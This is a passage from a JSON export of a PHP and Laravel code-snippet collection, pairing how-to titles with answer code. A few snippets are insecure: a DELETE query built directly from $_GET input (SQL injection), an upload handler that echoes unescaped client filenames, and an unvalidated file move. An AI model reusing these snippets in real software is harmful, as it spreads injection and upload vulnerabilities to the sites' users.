    "description": "$ brew uninstall --force php56 php56-apcu php56-opcache php56-xdebug php56-yaml $ brew uninstall --force php70 php70-apcu php70-opcache php70-xdebug php70-yaml $ brew uninstall --force php71 php71-apcu php71-opcache php71-xdebug php71-yaml $ brew uninstall --force php72 php72-apcu php72-opcache php72-xdebug php72-yaml $ brew cleanup\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1768,
    "keyword": null,
    "link": null,
    "title": " how to update all row in laravel",
    "description": "DB::table('table')->update(['column' => 1]);  Model::query()->update(['confirmed' => 1]);\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1769,
    "keyword": null,
    "link": null,
    "title": " how to update debian",
    "description": "apt-get update && apt-get upgrade\n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1770,
    "keyword": null,
    "link": null,
    "title": " how to upgrade php in mac mojave",
    "description": "brew tap shivammathur/php  \n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1771,
    "keyword": null,
    "link": null,
    "title": " how to upload image and rename in php",
    "description": "$temp = explode(\".\", $_FILES[\"file\"][\"name\"]); $newfilename = round(microtime(true)) . '.' . end($temp); move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"../img/imageDirectory/\" . $newfilename);\n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1772,
    "keyword": null,
    "link": null,
    "title": " how to use custom domain name on localhost on linux ubuntu",
    "description": "click on the link below  use custom domain name instead of writing localhost/yourprojectname/ on ubuntu linux xampp https://www.youtube.com/watch?v=2UbpmSNr48c\nsudo nano /etc/hosts # Add your Domain pointed to 127.0.0.1 or 0.0.0.0  127.0.0.1  domain.com  #Ctrl + O save Ctrl + X Exit\n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1773,
    "keyword": null,
    "link": null,
    "title": " how to use flash message in laravel",
    "description": "@if ($message = Session::get('success'))<div class=\"alert alert-success alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t        <strong>{{ $message }}</strong></div>@endif@if ($message = Session::get('error'))<div class=\"alert alert-danger alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t        <strong>{{ $message }}</strong></div>@endif@if ($message = Session::get('warning'))<div class=\"alert alert-warning alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t\t<strong>{{ $message }}</strong></div>@endif@if ($message = Session::get('info'))<div class=\"alert alert-info alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t\t<strong>{{ $message }}</strong></div>@endif@if ($errors->any())<div class=\"alert alert-danger\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t\tPlease check the form below for errors</div>@endif\nSession::flash('message', 'This is a message!');  Session::flash('alert-class', 'alert-danger');  \npublic function create(Request $request){    return redirect()->route('home')        ->with('error','You have no permission for this page!');}\n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1774,
    "keyword": null,
    "link": null,
    "title": " how to use for foreach loop in carousel in laravel blade",
    "description": "<div id=\"carouselExampleControls\" class=\"carousel slide\" data-ride=\"carousel\">    <ol class=\"carousel-indicators\">    @foreach( $photos as $photo )       <li data-target=\"#carouselExampleIndicators\" data-slide-to=\"{{ $loop->index }}\" class=\"{{ $loop->first ? 'active' : '' }}\"></li>    @endforeach   </ol>    <div class=\"carousel-inner\" role=\"listbox\">     @foreach( $photos as $photo )        <div class=\"carousel-item {{ $loop->first ? 'active' : '' }}\">            <img class=\"d-block img-fluid\" src=\"{{ $photo->image }}\" alt=\"{{ $photo->title }}\">               <div class=\"carousel-caption d-none d-md-block\">                  <h3>{{ $photo->title }}</h3>                  <p>{{ $photo->descriptoin }}</p>               </div>        </div>     @endforeach   </div>   <a class=\"carousel-control-prev\" href=\"#carouselExampleControls\" role=\"button\" data-slide=\"prev\">     <span class=\"carousel-control-prev-icon\" aria-hidden=\"true\"></span>     <span class=\"sr-only\">Previous</span>   </a>   <a class=\"carousel-control-next\" href=\"#carouselExampleControls\" role=\"button\" data-slide=\"next\">     <span class=\"carousel-control-next-icon\" aria-hidden=\"true\"></span>     <span class=\"sr-only\">Next</span>   </a> </div>\n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1775,
    "keyword": null,
    "link": null,
    "title": " how to use groupby and orderby together in laravel",
    "description": "You can use unique('field_name'); instead of groupBy('field_name'); /**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get()                             ->unique('sender_id');        dd($messages); }\n",
    "reg_date": "2021-10-12T10:15:05.000Z"
  },
  {
    "id": 1776,
    "keyword": null,
    "link": null,
    "title": " how to use javascript variable in php",
    "description": "<script type=\"text/javascript\"> var abc= 'this is text'; <?php $abc = \"<script>document.write(abc)</script>\"?>    </script> <?php echo $abc;?>\n<script type=\"text/javascript\">    var php_var = \"<?php echo $php_var; ?>\"; </script>\n<script>    var res = \"success\"; </script> <?php    echo \"<script>document.writeln(res);</script>\"; ?>\n<script> var p1 = \"success\"; </script>  <?php echo \"<script>document.writeln(p1);</script>\"; ?>\n<script type=\"text/javascript\"> // boolean outputs \"\" if false, \"1\" if true var bool = \"<?php echo $bool ?>\";   // numeric value, both with and without quotes var num = <?php echo $num ?>; // 7 var str_num = \"<?php echo $num ?>\"; // \"7\" (a string)  var str = \"<?php echo $str ?>\"; // \"A string here\" </script> \n<script type=\"text/javascript\"> // boolean outputs \"\" if false, \"1\" if true var bool = \"<?php echo $bool ?>\";   // numeric value, both with and without quotes var num = <?php echo $num ?>; // 7 var str_num = \"<?php echo $num ?>\"; // \"7\" (a string)  var str = \"<?php echo $str ?>\"; // \"A string here\" </script>\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1777,
    "keyword": null,
    "link": null,
    "title": " how to use join in laravel 5.4",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nDB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.id', 'contacts.phone', 'orders.price')             ->get();\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1778,
    "keyword": null,
    "link": null,
    "title": " how to use join query in codeigniter",
    "description": "public function getdata(){\t  \t$this->db->select('*'); \t$this->db->from('table1'); // this is first table name \t$this->db->join('table2', 'table2.id = table1.id'); // this is second table name with both table ids \t$query = $this->db->get(); \treturn $query->result();  \t}\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1779,
    "keyword": null,
    "link": null,
    "title": " how to use more than one database in codeigniter",
    "description": "This is default database :  $db['default'] = array(     ....   \t....     'database' => 'mydatabase',     .... ); Add another database at the bottom of database.php file  $db['second'] = array(     ....   \t....     'database' => 'mysecond',     .... );  In autoload.php config file  $autoload['libraries'] = array('database', 'email', 'session');  The default database is worked fine by autoload the database library but second database load and connect by using constructor in model and controller...  <?php     class Seconddb_model extends CI_Model {         function __construct(){             parent::__construct();             //load our second db and put in $db2             $this->db2 = $this->load->database('second', TRUE);         }          public function getsecondUsers(){             $query = $this->db2->get('members');             return $query->result();          }      } ?>    /* I hope it will help you. Namaste Stay Home Stay Safe */\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1780,
    "keyword": null,
    "link": null,
    "title": " how to use multiple where condition in codeigniter",
    "description": "$data = array('name' => 'Rockky'); \t\t$multiClause = array('id' => $ids, 'name' => $name, 'status' => 1 );  \t\t$this->db->where($multiClause);\t\t \t\t$query = $this->db->get('table-name', $data);\t \t\treturn $query->result();\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1781,
    "keyword": null,
    "link": null,
    "title": " how to use php",
    "description": "// Firstly you must have PHP installed & running a web server // This could be Apache, Nginx, etc... // Or for quick testing purposes and for the purpose // of this example, you could run // PHP's own dev server from a shell php -S 127.0.0.1:8080 -t your-web-directory-location // This will start a web server on localhost port 8080 // The -t switch sets the document root, this is where your // home page, typically index.php will be situated  // very basic index.php example <?php \techo \"Hello, world!\";    ?>    // You can now go to a browser and enter 127.0.0.1:8080 // You will presented with your simple web page // Hello, world!\nPHP is a general-purpose scripting language especially suited to web development.  It was originally created by Danish-Canadian programmer  Rasmus Lerdorf in 1994;  the PHP reference implementation is now produced by The PHP Group  Implementation language: C (primarily; some components C++) \n<?php             ?>\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1782,
    "keyword": null,
    "link": null,
    "title": " how to use php echo data in javascript",
    "description": "<?php $php_variable = 'string'; //Define our PHP variable. You can of course get the value of this variable however you need. ?>\t\t\t         <script> js_variable_name = \"<?php echo $php_variable; ?>\";</script> \n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1783,
    "keyword": null,
    "link": null,
    "title": " how to use plugin shortcode in wordpress template",
    "description": "function create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\n<?php echo do_shortcode(\"[insert-your-shortcode-here]\"); ?> \n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1784,
    "keyword": null,
    "link": null,
    "title": " how to use required with in laravel to array element",
    "description": "$validator = Validator::make($request->all(), [     \"names\"    => \"required|array|min:3\",     \"names.*\"  => \"required|string|distinct|min:3\", ]); \n$validator = Validator::make($request->all(), [     \"currency\"    => \"nullable|required_with:price.*|string\",     //or if you want to check currency for first price then use     // \"currency\"    => \"nullable|required_with:price.0|string\",     \"price\"    => \"required|array|min:3\",     \"price.*\"  => \"required|string|distinct|min:3\", ]);\n1. required_with:foo,bar,...    Use Case: The field under validation must be present and not empty only if any  =========  of the other specified fields are present.  2. required_with_all:foo,bar,...    Use Case: The field under validation must be present and not empty only if all  =========   of the other specified fields are present.  3. required_without:foo,bar,...  Use Case: The field under validation must be present and not empty only when  ========  any of the other specified fields are not present.  4. required_without_all:foo,bar,...  Use Case: The field under validation must be present and not empty only when  =========  all of the other specified fields are not present.\n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1785,
    "keyword": null,
    "link": null,
    "title": " how to use stored procedure in laravel",
    "description": "DB::select('exec my_stored_procedure(\"Param1\", \"param2\",..)'); or  DB::select('exec my_stored_procedure(?,?,..)',array($Param1,$param2)); Try this for without parameters  DB::select('EXEC my_stored_procedure')\nDB::connection(\"sqlsrv\")->statement('exec Pro_Internal_Transfer_Note_post @mvoucherid='.$VMID); \n",
    "reg_date": "2021-10-12T10:15:06.000Z"
  },
  {
    "id": 1786,
    "keyword": null,
    "link": null,
    "title": " how to use where relationship laravel",
    "description": "Event::with([\"owner\", \"participants\" => function($q) use($someId){     $q->where('participants.IdUser', '=', 1);     //$q->where('some other field', $someId); }])\n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1787,
    "keyword": null,
    "link": null,
    "title": " how to validate an email field using php",
    "description": "<?php    $email = \"pattrick@tutorialspoint.com\";    // Validate email    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {       echo(\"$email is a valid email address\");    }    else{       echo(\"$email is not a valid email address\");    } ?>\n// E-mail Code Validation using a four digit number:  // var.inc.php:  <?php  session_start(); $x = mt_rand(1000,9999); // index.php:  <?php  include_once 'var.inc.php'; $_SESSION['key'] = $x; if(isset($_POST['submit'])){     if(!mail($_POST['email-in'], \"Verify\", \"Code: \". $x)){         echo \"ERROR EMAIL\";     }else{         header(\"Location: validate.php\");     } } ?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate email</title> </head>  <body>     <form action=\"\" method=\"post\">         <input type=\"email\" placeholder=\"email\" name=\"email-in\">         <button id=\"submit\" type=\"submit\" name=\"submit\">Submit</button>     </form> </body> </html> // validate.php:    <?php session_start();?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate</title> </head> <body>     <form action=\"\" method=\"post\">         <input type=\"number\" name=\"user-key\">         <button type=\"submit\" name=\"submit-user-key\">Validate</button>     </form> </body> </html> <?php      if(isset($_POST['submit-user-key'])){         if($_POST['user-key'] == $_SESSION['key']){             //Do something         }     } ?>\n$pattern = '/^(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){255,})(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){65,}@)(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22))(?:\\\\.(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\\\]))$/iD';  $emailaddress = 'test@gmail.com';  if (preg_match($pattern, $emailaddress) === 1) {     // emailaddress is valid } \n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1788,
    "keyword": null,
    "link": null,
    "title": " how to validate video laravel",
    "description": "$this->validate($req, [       'video' => 'required|mimes:mp4,ogx,oga,ogv,ogg,webm',       ]); \n'video' => 'mimetypes:video/x-ms-asf,video/x-flv,video/mp4,application/x-mpegURL,video/MP2T,video/3gpp,video/quicktime,video/x-msvideo,video/x-ms-wmv,video/avi' \n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1789,
    "keyword": null,
    "link": null,
    "title": " how to write for loop in laravel blade",
    "description": "<div>     @for ($i = 0; $i < $max; $i++) //Where $max is whatever you need as break condition.         <p>{{ $i }}</p> //This would print $i in a paragraph. You do whatever you need here.     @endfor </div>\n// For @for ($i = 0; $i < max_value; $i++)      //your code @endfor //Foreach @foreach ($items as $item)      //your code @endforeach\n@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1790,
    "keyword": null,
    "link": null,
    "title": " how uninstall the laravel",
    "description": "composer global remove laravel/installer\nJust delete the folder. Composer just facilitate to create a laravel project on your behalf with correct version and dependencies.\n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1791,
    "keyword": null,
    "link": null,
    "title": " how unset request parameter in laravel",
    "description": "$request->except(['key1','key2',....]) \n$request->only(['key3','key4',....]) \n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1792,
    "keyword": null,
    "link": null,
    "title": " how upload image in arraye in laravel",
    "description": "   foreach ($request['contact'] as $value) {           $name = time() . rand(1000, 9999) . $value['image']->getClientOriginalName();           $value['image']->move(public_path('/src/admin/assets/uploader/workImage'), $name);         }\n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1793,
    "keyword": null,
    "link": null,
    "title": " how uplpoad video in laravel",
    "description": "<?php namespace App\\Http\\Controllers;  use Illuminate\\Support\\Facades\\Request;   class UploadController extends Controller {      public function upload(Request $request)     {          if(Request::hasFile('file')){              echo 'Uploaded';             $file = Request::file('file');             $file->move('uploads', $file->getClientOriginalName());             echo '$file' . $file->getClientOriginalName() . '\"/>';         }      } } \n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1794,
    "keyword": null,
    "link": null,
    "title": " how use trait in laravel",
    "description": "<?php   namespace App\\Traits;   trait StoreImageTrait {       public function verifyAndStoreImage() {       }   }  \n#There is no specific command for traits in Laravel 8 #Create app folder in Traits/UserTrait.php folder and file\n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1795,
    "keyword": null,
    "link": null,
    "title": " how use variable in string in laravel",
    "description": "   foreach($seeders as $seeder){             \\Artisan::call(\"db:seed --class={$seeder}\");         }\n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1796,
    "keyword": null,
    "link": null,
    "title": " how validate array in laravel in request",
    "description": "$validator = Validator::make($request->all(), [     \"names\"    => \"required|array|min:3\",     \"names.*\"  => \"required|string|distinct|min:3\", ]); \n",
    "reg_date": "2021-10-12T10:15:07.000Z"
  },
  {
    "id": 1797,
    "keyword": null,
    "link": null,
    "title": " how validate hash string in laravel",
    "description": "if (Hash::check('plain-text', $hashedPassword)) {     // The passwords match... }\n $hash = '$2y$10$ug8B6Pxs546eQBNICxsEOOH3NgpXjOIo.g4rf1FPZk2xJncWcFUpu';   if( strlen($hash) == 60 && preg_match('/^\\$2y\\$/', $hash )) \n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1798,
    "keyword": null,
    "link": null,
    "title": " how validate the becrypt password in laravel",
    "description": "        $request->validate([             'email' =>'required|exists:users',             'password'=>'required|password'         ]);\n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1799,
    "keyword": null,
    "link": null,
    "title": " how validate the value of object in arraye in laravel",
    "description": "        $request->validate([             'data.*.recommend_question_id'=>'required',             'data.*.recommend'=>'required',             'data.*.date'=>'required'         ]);\n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1800,
    "keyword": null,
    "link": null,
    "title": " how work instanceof php method",
    "description": "class MyClass { }  $o1 = new MyClass(); $o2 = new MyClass(); $name = 'MyClass';  // in the cases below, $a gets boolean value true $a = $o1 instanceof MyClass; $a = $o1 instanceof $name; $a = $o1 instanceof $o2;  // counter examples: $b = 'b'; $a = $o1 instanceof 'MyClass'; // parse error: constant not allowed $a = false instanceof MyClass; // fatal error: constant not allowed $a = $b instanceof MyClass;    // false ($b is not an object) \n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1801,
    "keyword": null,
    "link": null,
    "title": " htaccess post max size",
    "description": "php_value upload_max_filesize 20M php_value post_max_size 20M #php_value max_execution_time 200 #php_value max_input_time 200\n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1802,
    "keyword": null,
    "link": null,
    "title": " htaccess replace url parameter with slash prameter",
    "description": "RewriteEngine On RewriteBase / RewriteRule ^edit/id/([0-9]+)/?$ edit.php?id=$1 [NC,QSA,L] \n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1803,
    "keyword": null,
    "link": null,
    "title": " htaccess set php memory limit",
    "description": "<IfModule mod_php5.c>     php_value memory_limit 64M </IfModule> \n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1804,
    "keyword": null,
    "link": null,
    "title": " html button delete row from mysql",
    "description": "<?php  include \"dbConn.php\"; // Using database connection file here  $id = $_GET['id']; // get id through query string  $del = mysqli_query($db,\"delete from tblemp where id = '$id'\"); // delete query  if($del) {     mysqli_close($db); // Close connection     header(\"location:all_records.php\"); // redirects to all records page     exit;\t } else {     echo \"Error deleting record\"; // display error message if not delete } ?>\n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1805,
    "keyword": null,
    "link": null,
    "title": " html special char php",
    "description": "  <?php $str = \"This is some <b>bold</b> text.\"; echo htmlspecialchars($str);   ?> \n$string = \"This is testing message \"ETC\" \"; htmlspecialchars($string, ENT_COMPAT)\n",
    "reg_date": "2021-10-12T10:15:08.000Z"
  },
  {
    "id": 1806,
    "keyword": null,
    "link": null,
    "title": " html special characters php",
    "description": "/*  EXAMPLE:\t<p>Bed & Breakfast</p>\t-->\t  <p>Bed &amp; Breakfast</p>       & \t&amp;     \" \t&quot; \t\t\t\t(unless ENT_NOQUOTES is set)     ' \t&#039; or &apos; \t(ENT_QUOTES must be set)     < \t&lt;     > \t&gt;\t\t\t\t*/  <?php $new = htmlspecialchars(\"<a href='test'>Test</a>\", ENT_QUOTES); echo $new; \t\t\t\t\t// <a href='test'>Test</a> ?>\n  <?php $str = \"This is some <b>bold</b> text.\"; echo htmlspecialchars($str);   ?> \n$string = \"This is testing message \"ETC\" \"; htmlspecialchars($string, ENT_COMPAT)\n$source = 'url of page with text with special characters'; $html = file_get_contents($source,0); $html = mb_convert_encoding($html, 'UTF-8', mb_detect_encoding($html, 'UTF-8, ISO-8859-1', true));\n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1807,
    "keyword": null,
    "link": null,
    "title": " htmlspecialchars() expects parameter 1 to be string",
    "description": "<?php  $data = htmlspecialchars($data); echo $data;\nWhen you use a blade echo {{ $data }} it will automatically escape the output. It can only escape strings. In your data $data->ac is an array and $data is an object, neither of which can be echoed as is. You need to be more specific of how the data should be outputted. What exactly that looks like entirely depends on what you're trying to accomplish. For example to display the link you would need to do {{ $data->ac[0][0]['url'] }} (not sure why you have two nested arrays but I'm just following your data structure).  @foreach($data->ac['0'] as $link)     <a href=\"{{ $link['url'] }}\">This is a link</a> @endforeach\n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1808,
    "keyword": null,
    "link": null,
    "title": " htmlspecialchars",
    "description": " <?php $new = htmlspecialchars(\"<a href='test'>Test</a>\", ENT_QUOTES); echo $new; // <a href='test'>Test</a> ?>  \n$string = \"This is testing message \"ETC\" \"; htmlspecialchars($string, ENT_COMPAT)\n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1809,
    "keyword": null,
    "link": null,
    "title": " http error code php",
    "description": "    100 => 'Continue',     101 => 'Switching Protocols',     102 => 'Processing', // WebDAV; RFC 2518     103 => 'Early Hints', // RFC 8297     200 => 'OK',     201 => 'Created',     202 => 'Accepted',     203 => 'Non-Authoritative Information', // since HTTP/1.1     204 => 'No Content',     205 => 'Reset Content',     206 => 'Partial Content', // RFC 7233     207 => 'Multi-Status', // WebDAV; RFC 4918     208 => 'Already Reported', // WebDAV; RFC 5842     226 => 'IM Used', // RFC 3229     300 => 'Multiple Choices',     301 => 'Moved Permanently',     302 => 'Found', // Previously \"Moved temporarily\"     303 => 'See Other', // since HTTP/1.1     304 => 'Not Modified', // RFC 7232     305 => 'Use Proxy', // since HTTP/1.1     306 => 'Switch Proxy',     307 => 'Temporary Redirect', // since HTTP/1.1     308 => 'Permanent Redirect', // RFC 7538     400 => 'Bad Request',     401 => 'Unauthorized', // RFC 7235     402 => 'Payment Required',     403 => 'Forbidden',     404 => 'Not Found',     405 => 'Method Not Allowed',     406 => 'Not Acceptable',     407 => 'Proxy Authentication Required', // RFC 7235     408 => 'Request Timeout',     409 => 'Conflict',     410 => 'Gone',     411 => 'Length Required',     412 => 'Precondition Failed', // RFC 7232     413 => 'Payload Too Large', // RFC 7231     414 => 'URI Too Long', // RFC 7231     415 => 'Unsupported Media Type', // RFC 7231     416 => 'Range Not Satisfiable', // RFC 7233     417 => 'Expectation Failed',     418 => 'I\\'m a teapot', // RFC 2324, RFC 7168     421 => 'Misdirected Request', // RFC 7540     422 => 'Unprocessable Entity', // WebDAV; RFC 4918     423 => 'Locked', // WebDAV; RFC 4918     424 => 'Failed Dependency', // WebDAV; RFC 4918     425 => 'Too Early', // RFC 8470     426 => 'Upgrade Required',     428 => 'Precondition Required', // RFC 6585     429 => 'Too Many Requests', // RFC 6585     431 => 'Request Header Fields Too Large', // RFC 6585     451 => 'Unavailable For Legal Reasons', // RFC 7725     500 => 'Internal Server Error',     501 => 'Not Implemented',     502 => 'Bad Gateway',     503 => 'Service Unavailable',     504 => 'Gateway Timeout',     505 => 'HTTP Version Not Supported',     506 => 'Variant Also Negotiates', // RFC 2295     507 => 'Insufficient Storage', // WebDAV; RFC 4918     508 => 'Loop Detected', // WebDAV; RFC 5842     510 => 'Not Extended', // RFC 2774     511 => 'Network Authentication Required', // RFC 6585\n <?php  // R&eacute;cup&eacute;rer le code actuel de r&eacute;ponse et d&eacute;finir un nouveau var_dump(http_response_code(404));  // R&eacute;cup&eacute;rer le nouveau code de r&eacute;ponse var_dump(http_response_code()); ?>  \n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1810,
    "keyword": null,
    "link": null,
    "title": " http post request php curl",
    "description": "$post = [    'teste' => $_POST['teste'] ]; httpPost('url.com', $post); // function function httpPost($url, $data) {    \t$curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n    $post_data_arr = [       'f_name' => 'First',       'l_name' => 'Last',     ];           $url = 'http://example.com';     $curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data_arr);     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     print_r($response);  \n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1811,
    "keyword": null,
    "link": null,
    "title": " human readable date laravel",
    "description": "$object->updated_at->diffForHumans();\n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1812,
    "keyword": null,
    "link": null,
    "title": " human time php",
    "description": "// for a human time string like: \"It's around ten past twelve\"  // usage: echo 'It\\'s ' . humanTime(date('h'), date('i'));  function humanTime($hour, $min) {     $times = [         0 => '%s o\\'clock',         2 => 'a couple of mins past %s',         5 => 'five past %s',         8 => 'around ten past %s',         10 => 'ten past %s',         15 => 'quarter past %s',         20 => 'twenty past %s',         25 => 'twenty five past %s',         27 => 'around half past %s',         30 => 'half past %s',         33 => 'around thirty five past %s',         35 => 'thirty five past %s',         40 => 'twenty to %s',         43 => 'around quarter to %s',         45 => 'quarter to %s',         47 => 'about ten to %s',         50 => 'ten to %s',         53 => 'about five to %s',         55 => 'five to %s'     ];          $hourWord = [         'one',         'two',         'three',         'four',         'five',         'six',         'seven',         'eight',         'nine',         'ten',         'eleven',         'twelve'     ];      $hour = (int) $hour;     $min = (int) $min;          $closest = null;     foreach ($times as $key => $item)          if ($closest === null || abs($min - $closest) > abs($key - $min)) $closest = $key;          if ($hour === 0) $hour = 12;          if ($min > 40) $hour = $hour === 12 ? 1 : $hour + 1;      return sprintf($times[$closest], $hourWord[(int) $hour - 1]); }\n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1813,
    "keyword": null,
    "link": null,
    "title": " i+= in php",
    "description": " <?php  $a = 3; $a += 5; // sets $a to 8, as if we had said: $a = $a + 5; $b = \"Hello \"; $b .= \"There!\"; // sets $b to \"Hello There!\", just like $b = $b . \"There!\";  ?>  \n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
